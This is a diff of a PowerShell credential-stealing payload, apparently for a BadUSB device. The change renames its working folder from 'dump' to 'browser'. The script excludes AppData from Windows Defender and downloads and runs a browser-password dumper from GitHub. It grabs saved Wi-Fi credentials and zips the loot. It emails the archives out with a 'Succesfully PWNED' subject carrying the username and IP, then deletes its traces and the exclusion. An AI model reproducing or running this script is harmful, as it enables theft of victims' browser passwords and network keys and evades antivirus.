@@ -2,15 +2,15 @@
 Add-MpPreference -ExclusionPath "$env:appdata"
 #Creating the directory we will work on
 $pass1 = Get-Content $env:localappdata\Temp\pass1.txt
-mkdir "$env:appdata\Microsoft\dump"
+mkdir "$env:appdata\Microsoft\browser"
 mkdir "$env:appdata\Microsoft\wifi"
-Set-Location "$env:appdata\Microsoft\dump"
+Set-Location "$env:appdata\Microsoft\browser"
 #Downloading and executing hackbrowser.exe
 Invoke-WebRequest 'https://github.com/GamehunterKaan/BadUSB-Browser/raw/main/hackbrowser.exe' -OutFile "hb.exe"
 .\hb.exe --format json
-Remove-Item -Path "$env:appdata\Microsoft\dump\hb.exe" -Force
+Remove-Item -Path "$env:appdata\Microsoft\browser\hb.exe" -Force
 #Creating A Zip Archive
-Compress-Archive -Path * -DestinationPath dump.zip
+Compress-Archive -Path * -DestinationPath browser.zip
 #$Random = Get-Random
 #Wifi Grabber
 Set-Location "$env:appdata\Microsoft\wifi"
@@ -28,14 +28,14 @@ $Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
 $ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
 $Message.Body = $ComputerName
 #$files=Get-ChildItem 
-$Message.Attachments.Add("$env:appdata\Microsoft\dump\dump.zip")
+$Message.Attachments.Add("$env:appdata\Microsoft\browser\browser.zip")
 $Message.Attachments.Add("$env:appdata\Microsoft\wifi\wifi.zip")
 $smtp.Send($Message)
 $Message.Dispose()
 $smtp.Dispose()
 #Cleanup
 cd "$env:appdata"
-Remove-Item -Path "$env:appdata\Microsoft\dump" -Force -Recurse
+Remove-Item -Path "$env:appdata\Microsoft\browser" -Force -Recurse
 Remove-Item -Path "$env:appdata\Microsoft\wifi" -Force -Recurse
 Remove-Item -Path "$env:localappdata\Temp\pass1.txt" -Force
 Remove-MpPreference -ExclusionPath "$env:appdata"
